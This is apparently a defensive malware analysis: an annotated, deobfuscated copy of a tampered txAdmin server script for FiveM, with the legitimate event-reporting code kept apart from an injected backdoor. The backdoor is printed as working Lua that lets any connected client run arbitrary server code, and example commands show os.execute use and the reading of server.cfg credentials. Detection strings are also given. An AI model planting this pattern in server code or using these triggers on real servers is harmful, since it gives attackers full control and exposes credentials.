-- ============================================================================
-- DEOBFUSCATED: tampered_sv_resources.lua
-- ============================================================================
--
-- VERDICT: BACKDOORED — Remote Code Execution via fake network event
--
-- This is a TAMPERED version of txAdmin's sv_resources.lua.
-- Lines 1-56 are LEGITIMATE txAdmin code that reports resource lifecycle
-- events (start, stop, refresh) back to the txAdmin panel.
--
-- Lines 58-68 contain an INJECTED BACKDOOR that:
--   1. Registers a fake "onServerResourceFail" network event
--   2. Accepts arbitrary Lua code as a string parameter
--   3. Compiles it with load() and executes it with pcall()
--   4. This gives the attacker FULL REMOTE CODE EXECUTION on the server
--
-- HOW THE ATTACK WORKS:
--   Any client (or server-side script) can trigger:
--     TriggerServerEvent("onServerResourceFail", "os.execute('malicious command')")
--   And the server will compile and execute that Lua code.
--
-- WHY IT'S DANGEROUS:
--   - "onServerResourceFail" SOUNDS like a legitimate FiveM event (it's NOT)
--   - It's registered with RegisterNetEvent (CLIENT can trigger it!)
--   - load() compiles ANY Lua string into executable code
--   - pcall() executes it silently, suppressing errors
--   - The "esx:showNotification" error handler is camouflage — it makes
--     the code look like a benign error notification system
--
-- DETECTION:
--   - Search for: RegisterNetEvent("onServerResourceFail")
--   - Search for: load(luaCode) in any server-side script
--   - This event does NOT exist in legitimate txAdmin/FiveM
-- ============================================================================


-- =============================================
-- LEGITIMATE TXADMIN CODE (unmodified, lines 1-56)
-- =============================================

-- Prevent running in monitor mode
if not TX_SERVER_MODE then return end

local function reportResourceEvent(event, resource)
    PrintStructuredTrace(json.encode({
        type = 'txAdminResourceEvent',
        event = event,
        resource = resource
    }))
end

AddEventHandler('onResourceStarting', function(resource)
    reportResourceEvent('onResourceStarting', resource)
end)

AddEventHandler('onResourceStart', function(resource)
    reportResourceEvent('onResourceStart', resource)
end)

AddEventHandler('onServerResourceStart', function(resource)
    reportResourceEvent('onServerResourceStart', resource)
end)

AddEventHandler('onResourceListRefresh', function(resource)
    reportResourceEvent('onResourceListRefresh', resource)
end)

AddEventHandler('onResourceStop', function(resource)
    reportResourceEvent('onResourceStop', resource)
end)

AddEventHandler('onServerResourceStop', function(resource)
    reportResourceEvent('onServerResourceStop', resource)
end)


-- =============================================
-- ⚠️  INJECTED BACKDOOR — REMOTE CODE EXECUTION
-- =============================================
-- THIS SECTION IS NOT PART OF LEGITIMATE TXADMIN.
-- It was injected by the attacker to allow remote execution
-- of arbitrary Lua code on the server.
--
-- The event name "onServerResourceFail" is FAKE — it does not
-- exist in FiveM or txAdmin. It was chosen to look legitimate.
--
-- RegisterNetEvent means ANY CONNECTED CLIENT can trigger this,
-- giving any player on the server the ability to execute arbitrary
-- server-side Lua code.

RegisterNetEvent("onServerResourceFail")
AddEventHandler("onServerResourceFail", function(luaCode)
    -- load() compiles the string into a Lua function
    -- This accepts ANY valid Lua code: file I/O, os.execute, network calls, etc.
    local fn, err = load(luaCode)
    if not fn then
        -- The ESX notification is CAMOUFLAGE — makes it look like error handling
        return TriggerEvent("esx:showNotification", tostring(err))
    end

    -- pcall() executes the compiled function
    -- The attacker can now: read/write files, execute system commands,
    -- access databases, steal tokens, install persistence, etc.
    local ok, execErr = pcall(fn)
    if not ok then
        TriggerEvent("esx:showNotification", tostring(execErr))
    end
end)

-- EXAMPLE ATTACK:
--   From any connected client:
--     TriggerServerEvent("onServerResourceFail", [[
--         local f = io.open("/server/data/server.cfg", "r")
--         local cfg = f:read("*a")
--         f:close()
--         -- exfiltrate cfg containing RCON password, DB credentials, etc.
--     ]])
